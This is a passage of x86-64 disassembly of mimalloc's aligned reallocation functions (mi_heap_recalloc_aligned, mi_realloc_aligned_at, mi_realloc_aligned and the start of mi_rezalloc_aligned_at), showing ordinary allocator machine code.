  4049b5:	e8 06 d5 ff ff       	callq  401ec0 <mi_usable_size>
  4049ba:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
  4049bf:	48 39 c3             	cmp    %rax,%rbx
  4049c2:	49 89 c5             	mov    %rax,%r13
  4049c5:	0f 87 d5 00 00 00    	ja     404aa0 <mi_heap_recalloc_aligned+0x140>
  4049cb:	48 d1 e8             	shr    %rax
  4049ce:	4c 89 ee             	mov    %r13,%rsi
  4049d1:	48 29 c6             	sub    %rax,%rsi
  4049d4:	48 39 f3             	cmp    %rsi,%rbx
  4049d7:	72 27                	jb     404a00 <mi_heap_recalloc_aligned+0xa0>
  4049d9:	48 8d 44 0d 00       	lea    0x0(%rbp,%rcx,1),%rax
  4049de:	31 d2                	xor    %edx,%edx
  4049e0:	49 89 ee             	mov    %rbp,%r14
  4049e3:	49 f7 f4             	div    %r12
  4049e6:	48 85 d2             	test   %rdx,%rdx
  4049e9:	75 15                	jne    404a00 <mi_heap_recalloc_aligned+0xa0>
  4049eb:	48 83 c4 18          	add    $0x18,%rsp
  4049ef:	4c 89 f0             	mov    %r14,%rax
  4049f2:	5b                   	pop    %rbx
  4049f3:	5d                   	pop    %rbp
  4049f4:	41 5c                	pop    %r12
  4049f6:	41 5d                	pop    %r13
  4049f8:	41 5e                	pop    %r14
  4049fa:	41 5f                	pop    %r15
  4049fc:	c3                   	retq   
  4049fd:	0f 1f 00             	nopl   (%rax)
  404a00:	45 31 c0             	xor    %r8d,%r8d
  404a03:	4c 89 e2             	mov    %r12,%rdx
  404a06:	48 89 de             	mov    %rbx,%rsi
  404a09:	4c 89 ff             	mov    %r15,%rdi
  404a0c:	e8 df f3 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  404a11:	49 89 c6             	mov    %rax,%r14
  404a14:	48 85 c0             	test   %rax,%rax
  404a17:	74 77                	je     404a90 <mi_heap_recalloc_aligned+0x130>
  404a19:	4c 39 eb             	cmp    %r13,%rbx
  404a1c:	4c 89 ea             	mov    %r13,%rdx
  404a1f:	4c 89 f7             	mov    %r14,%rdi
  404a22:	48 89 ee             	mov    %rbp,%rsi
  404a25:	48 0f 46 d3          	cmovbe %rbx,%rdx
  404a29:	e8 72 c4 ff ff       	callq  400ea0 <memcpy@plt>
  404a2e:	48 89 ef             	mov    %rbp,%rdi
  404a31:	e8 2a d2 ff ff       	callq  401c60 <mi_free>
  404a36:	eb b3                	jmp    4049eb <mi_heap_recalloc_aligned+0x8b>
  404a38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  404a3f:	00 
  404a40:	48 83 c4 18          	add    $0x18,%rsp
  404a44:	48 89 da             	mov    %rbx,%rdx
  404a47:	48 89 ee             	mov    %rbp,%rsi
  404a4a:	4c 89 ff             	mov    %r15,%rdi
  404a4d:	5b                   	pop    %rbx
  404a4e:	b9 01 00 00 00       	mov    $0x1,%ecx
  404a53:	5d                   	pop    %rbp
  404a54:	41 5c                	pop    %r12
  404a56:	41 5d                	pop    %r13
  404a58:	41 5e                	pop    %r14
  404a5a:	41 5f                	pop    %r15
  404a5c:	e9 bf dd ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  404a61:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  404a68:	48 83 c4 18          	add    $0x18,%rsp
  404a6c:	4c 89 e2             	mov    %r12,%rdx
  404a6f:	48 89 de             	mov    %rbx,%rsi
  404a72:	4c 89 ff             	mov    %r15,%rdi
  404a75:	5b                   	pop    %rbx
  404a76:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  404a7c:	5d                   	pop    %rbp
  404a7d:	41 5c                	pop    %r12
  404a7f:	41 5d                	pop    %r13
  404a81:	41 5e                	pop    %r14
  404a83:	41 5f                	pop    %r15
  404a85:	e9 66 f3 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  404a8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404a90:	45 31 f6             	xor    %r14d,%r14d
  404a93:	e9 53 ff ff ff       	jmpq   4049eb <mi_heap_recalloc_aligned+0x8b>
  404a98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  404a9f:	00 
  404aa0:	45 31 c0             	xor    %r8d,%r8d
  404aa3:	4c 89 e2             	mov    %r12,%rdx
  404aa6:	48 89 de             	mov    %rbx,%rsi
  404aa9:	4c 89 ff             	mov    %r15,%rdi
  404aac:	e8 3f f3 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  404ab1:	49 89 c6             	mov    %rax,%r14
  404ab4:	48 85 c0             	test   %rax,%rax
  404ab7:	74 d7                	je     404a90 <mi_heap_recalloc_aligned+0x130>
  404ab9:	49 83 fd 08          	cmp    $0x8,%r13
  404abd:	bf 08 00 00 00       	mov    $0x8,%edi
  404ac2:	48 89 da             	mov    %rbx,%rdx
  404ac5:	49 0f 43 fd          	cmovae %r13,%rdi
  404ac9:	31 f6                	xor    %esi,%esi
  404acb:	48 83 ef 08          	sub    $0x8,%rdi
  404acf:	48 29 fa             	sub    %rdi,%rdx
  404ad2:	4c 01 f7             	add    %r14,%rdi
  404ad5:	e8 86 c3 ff ff       	callq  400e60 <memset@plt>
  404ada:	e9 3a ff ff ff       	jmpq   404a19 <mi_heap_recalloc_aligned+0xb9>
  404adf:	90                   	nop

0000000000404ae0 <mi_realloc_aligned_at>:
  404ae0:	41 57                	push   %r15
  404ae2:	41 56                	push   %r14
  404ae4:	41 55                	push   %r13
  404ae6:	41 54                	push   %r12
  404ae8:	55                   	push   %rbp
  404ae9:	53                   	push   %rbx
  404aea:	48 83 ec 18          	sub    $0x18,%rsp
  404aee:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  404af5:	64 4c 8b 38          	mov    %fs:(%rax),%r15
  404af9:	48 83 fa 08          	cmp    $0x8,%rdx
  404afd:	0f 86 95 00 00 00    	jbe    404b98 <mi_realloc_aligned_at+0xb8>
  404b03:	48 85 ff             	test   %rdi,%rdi
  404b06:	0f 84 b4 00 00 00    	je     404bc0 <mi_realloc_aligned_at+0xe0>
  404b0c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
  404b11:	48 89 f3             	mov    %rsi,%rbx
  404b14:	49 89 d6             	mov    %rdx,%r14
  404b17:	49 89 fd             	mov    %rdi,%r13
  404b1a:	e8 a1 d3 ff ff       	callq  401ec0 <mi_usable_size>
  404b1f:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
  404b24:	48 39 c3             	cmp    %rax,%rbx
  404b27:	48 89 c5             	mov    %rax,%rbp
  404b2a:	77 20                	ja     404b4c <mi_realloc_aligned_at+0x6c>
  404b2c:	48 d1 e8             	shr    %rax
  404b2f:	48 89 ee             	mov    %rbp,%rsi
  404b32:	48 29 c6             	sub    %rax,%rsi
  404b35:	48 39 f3             	cmp    %rsi,%rbx
  404b38:	72 12                	jb     404b4c <mi_realloc_aligned_at+0x6c>
  404b3a:	49 8d 44 0d 00       	lea    0x0(%r13,%rcx,1),%rax
  404b3f:	31 d2                	xor    %edx,%edx
  404b41:	4d 89 ec             	mov    %r13,%r12
  404b44:	49 f7 f6             	div    %r14
  404b47:	48 85 d2             	test   %rdx,%rdx
  404b4a:	74 36                	je     404b82 <mi_realloc_aligned_at+0xa2>
  404b4c:	45 31 c0             	xor    %r8d,%r8d
  404b4f:	4c 89 f2             	mov    %r14,%rdx
  404b52:	48 89 de             	mov    %rbx,%rsi
  404b55:	4c 89 ff             	mov    %r15,%rdi
  404b58:	e8 93 f2 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  404b5d:	49 89 c4             	mov    %rax,%r12
  404b60:	48 85 c0             	test   %rax,%rax
  404b63:	74 1d                	je     404b82 <mi_realloc_aligned_at+0xa2>
  404b65:	48 39 eb             	cmp    %rbp,%rbx
  404b68:	48 89 ea             	mov    %rbp,%rdx
  404b6b:	48 89 c7             	mov    %rax,%rdi
  404b6e:	4c 89 ee             	mov    %r13,%rsi
  404b71:	48 0f 46 d3          	cmovbe %rbx,%rdx
  404b75:	e8 26 c3 ff ff       	callq  400ea0 <memcpy@plt>
  404b7a:	4c 89 ef             	mov    %r13,%rdi
  404b7d:	e8 de d0 ff ff       	callq  401c60 <mi_free>
  404b82:	48 83 c4 18          	add    $0x18,%rsp
  404b86:	4c 89 e0             	mov    %r12,%rax
  404b89:	5b                   	pop    %rbx
  404b8a:	5d                   	pop    %rbp
  404b8b:	41 5c                	pop    %r12
  404b8d:	41 5d                	pop    %r13
  404b8f:	41 5e                	pop    %r14
  404b91:	41 5f                	pop    %r15
  404b93:	c3                   	retq   
  404b94:	0f 1f 40 00          	nopl   0x0(%rax)
  404b98:	48 83 c4 18          	add    $0x18,%rsp
  404b9c:	48 89 f2             	mov    %rsi,%rdx
  404b9f:	31 c9                	xor    %ecx,%ecx
  404ba1:	48 89 fe             	mov    %rdi,%rsi
  404ba4:	5b                   	pop    %rbx
  404ba5:	4c 89 ff             	mov    %r15,%rdi
  404ba8:	5d                   	pop    %rbp
  404ba9:	41 5c                	pop    %r12
  404bab:	41 5d                	pop    %r13
  404bad:	41 5e                	pop    %r14
  404baf:	41 5f                	pop    %r15
  404bb1:	e9 6a dc ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  404bb6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  404bbd:	00 00 00 
  404bc0:	48 83 c4 18          	add    $0x18,%rsp
  404bc4:	4c 89 ff             	mov    %r15,%rdi
  404bc7:	45 31 c0             	xor    %r8d,%r8d
  404bca:	5b                   	pop    %rbx
  404bcb:	5d                   	pop    %rbp
  404bcc:	41 5c                	pop    %r12
  404bce:	41 5d                	pop    %r13
  404bd0:	41 5e                	pop    %r14
  404bd2:	41 5f                	pop    %r15
  404bd4:	e9 17 f2 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  404bd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000404be0 <mi_realloc_aligned>:
  404be0:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  404be7:	49 89 fb             	mov    %rdi,%r11
  404bea:	49 89 d2             	mov    %rdx,%r10
  404bed:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  404bf1:	48 83 fa 08          	cmp    $0x8,%rdx
  404bf5:	76 29                	jbe    404c20 <mi_realloc_aligned+0x40>
  404bf7:	4c 89 d8             	mov    %r11,%rax
  404bfa:	31 d2                	xor    %edx,%edx
  404bfc:	49 f7 f2             	div    %r10
  404bff:	4d 85 db             	test   %r11,%r11
  404c02:	74 2c                	je     404c30 <mi_realloc_aligned+0x50>
  404c04:	49 89 d0             	mov    %rdx,%r8
  404c07:	45 31 c9             	xor    %r9d,%r9d
  404c0a:	48 89 f2             	mov    %rsi,%rdx
  404c0d:	4c 89 d1             	mov    %r10,%rcx
  404c10:	4c 89 de             	mov    %r11,%rsi
  404c13:	e9 48 f2 ff ff       	jmpq   403e60 <mi_heap_realloc_zero_aligned_at.part.0>
  404c18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  404c1f:	00 
  404c20:	48 89 f2             	mov    %rsi,%rdx
  404c23:	31 c9                	xor    %ecx,%ecx
  404c25:	4c 89 de             	mov    %r11,%rsi
  404c28:	e9 f3 db ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  404c2d:	0f 1f 00             	nopl   (%rax)
  404c30:	48 89 d1             	mov    %rdx,%rcx
  404c33:	45 31 c0             	xor    %r8d,%r8d
  404c36:	4c 89 d2             	mov    %r10,%rdx
  404c39:	e9 b2 f1 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  404c3e:	66 90                	xchg   %ax,%ax

0000000000404c40 <mi_rezalloc_aligned_at>:
  404c40:	41 57                	push   %r15
  404c42:	41 56                	push   %r14
  404c44:	41 55                	push   %r13
  404c46:	41 54                	push   %r12
  404c48:	55                   	push   %rbp
  404c49:	53                   	push   %rbx
  404c4a:	48 83 ec 18          	sub    $0x18,%rsp
  404c4e:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  404c55:	64 4c 8b 38          	mov    %fs:(%rax),%r15
  404c59:	48 83 fa 08          	cmp    $0x8,%rdx
  404c5d:	0f 86 9d 00 00 00    	jbe    404d00 <mi_rezalloc_aligned_at+0xc0>
  404c63:	48 85 ff             	test   %rdi,%rdi
  404c66:	0f 84 c4 00 00 00    	je     404d30 <mi_rezalloc_aligned_at+0xf0>
  404c6c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
  404c71:	48 89 f5             	mov    %rsi,%rbp
  404c74:	49 89 d6             	mov    %rdx,%r14
  404c77:	48 89 fb             	mov    %rdi,%rbx
  404c7a:	e8 41 d2 ff ff       	callq  401ec0 <mi_usable_size>
  404c7f:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
  404c84:	48 39 c5             	cmp    %rax,%rbp
  404c87:	49 89 c4             	mov    %rax,%r12
  404c8a:	0f 87 c0 00 00 00    	ja     404d50 <mi_rezalloc_aligned_at+0x110>
  404c90:	48 d1 e8             	shr    %rax
  404c93:	4c 89 e6             	mov    %r12,%rsi
  404c96:	48 29 c6             	sub    %rax,%rsi
  404c99:	48 39 f5             	cmp    %rsi,%rbp
  404c9c:	72 11                	jb     404caf <mi_rezalloc_aligned_at+0x6f>
  404c9e:	48 8d 04 0b          	lea    (%rbx,%rcx,1),%rax
